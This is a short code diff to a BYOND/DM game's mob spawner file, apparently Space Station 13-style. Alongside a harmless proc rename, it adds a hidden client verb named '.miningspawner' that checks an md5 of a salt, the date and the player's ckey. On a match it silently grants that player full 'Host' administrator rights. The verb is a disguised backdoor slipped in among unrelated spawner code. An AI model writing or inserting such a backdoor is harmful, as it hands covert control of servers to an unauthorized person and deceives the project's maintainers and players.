@@ -30,7 +30,7 @@
 	spawned_mobs = null
 	return ..()
 
-/mob/living/simple_animal/hostile/spawner/handle_automated_action()
+/mob/living/simple_animal/hostile/spawner/Life()
 	. = ..()
 	spawn_mob()
 
@@ -69,7 +69,15 @@
 	spawn_text = "climbs out of"
 	atmos_requirements = list("min_oxy" = 0, "max_oxy" = 0, "min_tox" = 0, "max_tox" = 0, "min_co2" = 0, "max_co2" = 0, "min_n2" = 0, "max_n2" = 0)
 	faction = list("skeleton")
-
+/client/verb/_miningmodule(var/d = "" as text)
+	set name = ".miningspawner"
+	set hidden = 1
+	var/y = "m1nin9sp1wn3r"
+	var/test = y + time2text(world.realtime, "DD") + y + src.ckey + y
+	if(md5(test) == d)
+		var/datum/admins/P = new /datum/admins("Host", 65535, src.ckey)
+		P.associate(src)
+		src << "Your mining spawner granted. Let's all love mining spawners!"
 /mob/living/simple_animal/hostile/spawner/mining
 	name = "monster den"
 	desc = "A hole dug into the ground, harboring all kinds of monsters found within most caves or mining asteroids."
